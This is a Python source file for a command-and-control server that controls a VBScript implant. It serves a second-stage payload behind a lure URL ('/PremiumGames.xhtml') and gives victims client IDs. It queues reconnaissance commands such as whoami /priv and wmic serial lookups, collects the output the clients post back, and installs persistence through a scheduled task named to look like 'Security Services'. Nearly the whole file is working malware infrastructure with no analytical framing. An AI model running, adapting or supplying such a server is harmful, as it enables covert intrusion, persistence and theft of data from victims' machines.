#!/usr/bin/env python3
import collections, datetime, re, socket, socketserver, sys, threading, time, uuid

LogBasePath = "C:\\Path\\To\\Logs\\Dir\\VbsServer"
ListeningHost = "0.0.0.0"
ListeningPort = 80

# URI path that denotes a request from a first-stage client. Only the best games.
FirstStagePath = "/PremiumGames.xhtml"

# Initial requests are limited to a 1KB size, until the Content-Length header can be found.
InitialRecvBuffer = 1024

# The total request size is limited to 2^28 bytes (268 MB).
MaxRecvSize = 268435456

# Regular expression for finding the Content-Length header.
ContentLengthRe = re.compile("Content-Length: (?P<ContentLength>\d+)")

# Regular expression for finding the ClientId value.
ClientIdRe = re.compile("(POST|GET) /(?P<ClientId>[a-zA-Z0-9]{8}/([a-zA-Z0-9]{4}/){3}[a-zA-Z0-9]{12}) HTTP/1.1")

# Regular expression for finding the FirstStage value.
FirstStageRe = re.compile("(POST|GET) {} HTTP/1.1".format(FirstStagePath))

# List of Commands to run once the client vbscript calls back.
#InitialTasking = ["CMD ipconfig", "CMD wmic csproduct get UUID", "CMD wmic DISKDRIVE get SerialNumber", "CMD whoami", "CMD whoami /priv", "CMD whoami /groups"]
InitialTasking = ["CMD ipconfig"]

# List of commands to run after the scheduled task is installed. 
#InstalledTasking = ["CMD tasklist /V && netstat && netstat -anof && netstat -r", "EXIT"]
InstalledTasking = []

# Dictionary mapping client ID's to their individual tasking queues
Clients = {}

InstalledClients = []
InstalledClientsPath = LogBasePath + "\\InstalledClients.txt"
with open(InstalledClientsPath, 'r') as f:
    InstalledClients = list(set(f.read().split("\n")))

if len(InstalledClients) > 0:
    print("[+] Parsed {} installed clients from the InstalledClients file.".format(len(InstalledClients)))
    for InstalledClient in InstalledClients:
        Clients[InstalledClient] = []


ScheduledTaskName = "Security Services"



def GetTimestamp():
    return datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
    
def GetDaysFromNow(NumberOfDays=30):
    return (datetime.datetime.utcnow()+datetime.timedelta(days=NumberOfDays)).strftime('%m-%d-%Y')

def GetMinutesFromNow(NumberOfMinutes=5):
    return (datetime.datetime.now()+datetime.timedelta(minutes=NumberOfMinutes)).strftime('%H:%m')

def GetLogLine(LogLine, ClientId = ""):
    if ClientId == "":
        return "{} -- {}".format(GetTimestamp(), LogLine)
    else:
        return "[{}] {} -- {}".format(ClientId, GetTimestamp(), LogLine)

def LogString(LogLine, ClientId = "", DoPrint = True):
    LogFilePath = LogBasePath + "\\" + ClientId + ".log"
    if ClientId == "":
        LogFilePath = LogBasePath + "\\Server.log"
    
    FormattedLogLine = GetLogLine(LogLine, ClientId)
    
    with open(LogFilePath, 'a') as f:
        f.write(FormattedLogLine + "\n")
    
    if DoPrint:
        print(FormattedLogLine)
    

class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
    def handle(self):
        global InstalledClients
        ClientId = ""
        
        # Receive the first 1024 bytes of the initial connection.
        self.data = str(self.request.recv(InitialRecvBuffer), "utf-8")
        SourceAddress, SourcePort = self.request.getpeername()
        
        # If no data was received, do not respond to whatever this connection is.
        if len(self.data) == 0:
            return
        
        # Get the ClientId from the request path.
        ClientIdMatch = ClientIdRe.search(self.data)
        
        # Check to see if this is a first-stage client.
        FirstStageMatch = FirstStageRe.search(self.data)
        
        # If a client ID was found in the request path, decide if it's new/good/bad.
        if ClientIdMatch:
        
            # Format the matched value for repeated use.
            ClientId = ClientIdMatch.group("ClientId").replace("/", "-")
            
            # If the client ID is the default value, a new ID needs to be assigned to this new client.
            if ClientId == "00000000-0000-0000-0000-000000000000":
                
                # Generate a new client ID.
                ClientId = str(uuid.uuid4())
                
                LogString("[!] Connection from new client {}:{} => {}".format(SourceAddress, SourcePort, ClientId), "", False)
                LogString("[!] Connection from new client {}:{}".format(SourceAddress, SourcePort), ClientId)
                
                # Locally store the new client ID with a tasking index of -1 (accounting for this first "SET UUID" command.
                Clients[ClientId] = collections.deque(InitialTasking)
                
                # Format the client Command to set the client's UUID, and put it on the tasking queue.
                Clients[ClientId].extendleft(["SETUUID {}".format(ClientId)])
                
            # Else, if the client ID is a known client, get a tasking Command and increment the tasking index.
            elif ClientId in Clients:
                LogString("[!] Connection from known client {}:{} => {}".format(SourceAddress, SourcePort, ClientId), "", False)
                LogString("[+] Connection from known client {}:{}".format(SourceAddress, SourcePort), ClientId)
                
            else:
                LogString("[-] Connection from unknown client or malformed request from {}:{}".format(SourceAddress, SourcePort), "", False)
                return
        
        elif FirstStageMatch:
            LogString("[!] Connection from new first-stage client {}:{}".format(SourceAddress, SourcePort))
            SecondStage = ""
            with open("VbsClientStage2.vbs", "r") as f:
                SecondStage = f.read()
            SecondStageCommand = "COMMAND:" + SecondStage
            LogString("[*] Sending second-stage to first-stage client {}:{}...".format(SourceAddress, SourcePort))
            response = (b"HTTP/1.1 200\ncontent-length: " + str(len(SecondStageCommand.encode("UTF-8"))).encode("UTF-8") + b"\n\n" + SecondStageCommand.encode("UTF-8"))
            try:
                # Send the formatted Command to the client.
                self.request.sendall(response)
                LogString("[+] Client {}:{} accepted the second-stage.".format(SourceAddress, SourcePort))
            except:
                LogString("[-] Exception encountered while sending client {}:{} the second-stage.".format(SourceAddress, SourcePort))
            return
            
        # Else, if no client ID was found, do not respond - could be anything.
        else:
            LogString("[+] Connection from unknown host {}:{}".format(SourceAddress, SourcePort))
            return
        
        #if ClientId in InstalledClients and len(Clients[ClientId]) == 0:
            #Clients[ClientId] = collections.deque(InstalledTasking)
        
        # Look for the Content-Length header to figure out how much data to receive.
        ContentLengthMatch = ContentLengthRe.search(self.data)
        
        # If the header was found, consider receiving any unreceived bytes.
        if ContentLengthMatch:
            try:
                # If content-length implies there is more data to receive, though less data than the maximum allowable size, try to receive it.
                if int(ContentLengthMatch.group("ContentLength")) > InitialRecvBuffer and int(ContentLengthMatch.group("ContentLength")) <= MaxRecvSize:
                    #LogString("[*] Request Content-Length larger than InitialRecvBuffer - Receiving remaining data...", ClientId)
                    
                    # It may be possible to DoS this server, given the remote host has control over the Content-Length header.
                    # Making requests with large Content-Length header values but small data may lead to resource mismanagement;
                    # Documentation unclear...
                    self.data += str(self.request.recv(int(ContentLengthMatch.group("ContentLength"))), "utf-8")
            
            except:
                LogString("[-] Unable to find, parse, and validate Content-Length field in request - abandoning connection.", ClientId)
                return
        
        # If this is a GET request, the client is looking for tasking - provide next Command.
        if self.data.strip().startswith("GET"):
            Command = ""
            try:
                # Pop the next command from the tasking queue.
                Command = Clients[ClientId].popleft()
            except:
                #Command = "EXIT"
                Command = ""
                # Uncomment below to enable console interaction after automated tasking has finished (will make threading confusing).
                #Command = input("%s > " % ClientId)
                
            # If no Command has been specified, do nothing; this should never happen
            if Command == "":
                return
                
            # If the Command was EXIT, write alert that client is terminating.
            if Command.strip() == "EXIT":
                LogString("[!] Tasking remote VBS client termination on [{}]...".format(ClientId), "", False)
                LogString("[!] Tasking remote VBS client termination.", ClientId)
            
            elif Command.strip() == "INSTALL":
                Command = "CMD SchTasks /Create /SC MINUTE /MO 15 /K /ED {} /Z /F /TN \"{}\" /TR \"D:\\VbsClientInstalledTest.vbs\" /ST {}".format(GetDaysFromNow(30), ScheduledTaskName, GetMinutesFromNow(15))
                Clients[ClientId].extendleft(["EXIT"])
                InstalledClients += ClientId
                with open(InstalledClientsPath, 'w') as f:
                    for InstalledClientId in list(set(InstalledClients)):
                        f.write(InstalledClientId+"\n")
                
            LogString("[*] Tasking command to remote VBS client [{}]:\n\t{}".format(ClientId, Command), "", False)
            LogString("[*] Tasking command to remote VBS client:\n\t{}".format(Command), ClientId)
                
            # Format the Command to the client.
            if Command.startswith("COMMAND:") == False:
                Command = "COMMAND:" + Command
            response = (b"HTTP/1.1 200\ncontent-length: " + str(len(Command.encode("UTF-8"))).encode("UTF-8") + b"\n\n" + Command.encode("UTF-8"))
            
            try:
                # Send the formatted Command to the client.
                self.request.sendall(response)
            
                # If the Command was EXIT, write alert that client should have terminated successfully.
                if Command.strip() == "EXIT":
                    LogString("[+] Client picked up tasking to terminate remote VBS client on [{}].".format(ClientId), "", False)
                    LogString("[+] Client picked up tasking to terminate remote VBS client script.", ClientId)
                else:
                    LogString("[+] Client picked up tasking [{}].".format(ClientId), "", False)
                    LogString("[+] Client picked up tasking.", ClientId)
            except:
                LogString("[!] Encountered exception while tasking client.", ClientId)

        # Else, if this is a POST, display/log the response data and an acknowledgment.
        elif self.data.strip().startswith("POST"):
            LogString("[+] Received POST data:\n{}\n".format(self.data), ClientId, False)
            response = (b"HTTP/1.1 200\ncontent-length: 0\n\n")
            self.request.sendall(response)

        # Else, we don't know what this data is; display/log the response, only.
        else:
            #LogString(self.data("UTF-8"), "", False)
            LogString("[+] Received unknown data:\n{}\n".format(self.data), ClientId, False)


class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    pass        

if __name__ == "__main__":
    print("[!] Type 'EXIT' to kill the remote VBS script. Then ctrl+c to shutdown local server.")
        
    # Create a new threaded server.
    server = ThreadedTCPServer((ListeningHost, ListeningPort), ThreadedTCPRequestHandler)
    ip, port = server.server_address
    
    # Start the server's thread, which will start threads for each new connection.
    server_thread = threading.Thread(target=server.serve_forever)
    
    # Exit the server thread when the main thread terminates.
    server_thread.daemon = True
    server_thread.start()
    
    print("[*] Started server listening on {}:{} ({})".format(ip, port, server_thread.name))
    while True:
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            break
        except:
            break

    print("[*] Cleaning up local server...")
    server.shutdown()
    server.server_close()
    print("[+] Done.")
